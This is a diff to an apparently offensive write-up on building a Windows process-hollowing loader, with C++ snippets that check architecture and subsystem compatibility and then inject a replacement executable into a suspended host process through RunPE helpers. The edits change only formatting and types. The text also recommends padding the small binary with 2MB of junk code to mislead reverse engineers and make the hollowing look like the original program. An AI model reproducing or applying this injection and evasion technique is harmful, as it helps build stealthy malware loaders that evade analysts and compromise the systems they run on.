@@ -59,22 +59,24 @@ What's important here is the `HOST_PROCESS` variable and `CREATE_SUSPENDED` flag
 
 We also need to check whether or not the running executable is compatible (has the same architecture as our replacement code). To do this, I'm using functions from the `Process-Hollowing` repository:
 
-    BOOL bTarget32;
+    bool bTarget32;
     IsWow64Process(PI.hProcess, &bTarget32);
     ProcessAddressInformation ProcessAddressInformation = { nullptr, nullptr };
     ProcessAddressInformation = GetProcessAddressInformation64(&PI); // Get base address of process to hollow
-    const BOOL bSource32 = IsPE32(hFileContent); // hFileContent is a cast of buffer to type LPVOID
+    const bool bSource32 = IsPE32(hFileContent); // hFileContent is a cast of buffer to type LPVOID
 
-    // Subsystem check
     DWORD dwSourceSubsystem = GetSubsytem64(hFileContent);
     DWORD dwTargetSubsystem = GetSubsystemEx64(PI.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);
-    if (dwSourceSubsystem != dwTargetSubsystem) return;
+    if (dwSourceSubsystem != dwTargetSubsystem) 
+        return;
 
 Finally, we do the actual process hollowing
 
-    BOOL bHasReloc = HasRelocation64(hFileContent);
-    if (!bHasReloc) { RunPE64(&PI, hFileContent); }
-    else { RunPEReloc64(&PI, hFileContent); }
+    bool bHasReloc = HasRelocation64(hFileContent);
+    if (!bHasReloc) 
+        RunPE64(&PI, hFileContent); 
+    else 
+        RunPEReloc64(&PI, hFileContent); 
 
 ### More Important Things
 One neat thing we can do to confuse reverse-engineerers is to pad our executable with junk code, since the whole program only ends up at about 16kb. There aren't many programs that small, so we need to add junk code to make our process hollowing look like it's just running the original program. I added 2mb of filler to the program, since the binaries we were downloading were around that size.
